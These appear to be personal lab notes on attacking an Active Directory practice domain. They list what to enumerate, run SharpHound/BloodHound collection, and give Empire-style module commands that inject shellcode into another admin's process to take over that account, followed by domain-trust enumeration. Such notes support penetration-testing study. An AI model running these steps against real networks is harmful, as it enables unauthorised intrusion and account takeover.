information I want to collect about the domain
  what are the users
  who are the domain controllers (their ip, names, hostnames)
  user priviledges (ACL)
  type of hosts
  GPOs
  check priviledges, users, groups, access they got, can do rdp on what

tool: bloodhound
  sharphound.exe -d north.sevenkingdoms.local
    should be a domain user not local user because we are not sending th id credentials to the domain controller
    so I need to be running the collector as domain user
    I can do enumeration as low priviledge domain user

    from victim:
    sharphound.exe -c All

    explore then injest zip file
    after done go to explore
      search (Jeor)

ps // see the processes
if I am admin // I can inject shellcode for processes of other admins
  usemodule csharp_management_processinjection // just wrote injection and used autocomplete
  set listener http
  set pid 4776 // id for process for robb.stark
  execute
  now I get access to robb.stark

  -usemodule powerview..._get_computer
  execute
  - hostname should also work

usemodule get_domain_trusts
execute
